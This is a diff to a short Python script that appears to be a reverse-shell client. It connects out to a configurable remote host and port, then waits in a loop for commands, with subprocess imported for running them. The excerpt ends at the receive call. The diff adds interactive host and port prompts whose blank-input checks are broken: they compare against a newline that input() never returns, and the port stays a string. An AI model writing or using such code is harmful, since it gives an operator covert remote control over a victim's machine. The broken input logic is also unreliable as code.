@@ -5,25 +5,29 @@ Date: September 2022
 """
 
 # Imports
-
-
-# Setting Up IP/Sockets
-
-
-# Initializing Connection
-
-# Runtime Loop
-
 import socket
 import subprocess
-REMOTE_HOST = '127.0.0.1' # '192.168.43.82'
+
+# Setting Up IP/Sockets
+REMOTE_HOST = '127.0.0.1' 
 REMOTE_PORT = 8081 # 2222
 client = socket.socket()
 
+# Ask for and set new IP & Port
+new_host = input('Input Host IP (Blank if default).')
+new_port = input('Input Host Port (Blank if default).')
+
+if (new_host != "\n"):
+    REMOTE_HOST = new_host
+if (new_port != "\n"):
+    REMOTE_PORT = new_port
+
+# Initializing Connection
 print("[-] Connection Initiating...")
 client.connect((REMOTE_HOST, REMOTE_PORT))
 print("[-] Connection initiated!")
 
+# Runtime Loop
 while True:
     print("[-] Awaiting commands...")
     command = client.recv(1024)
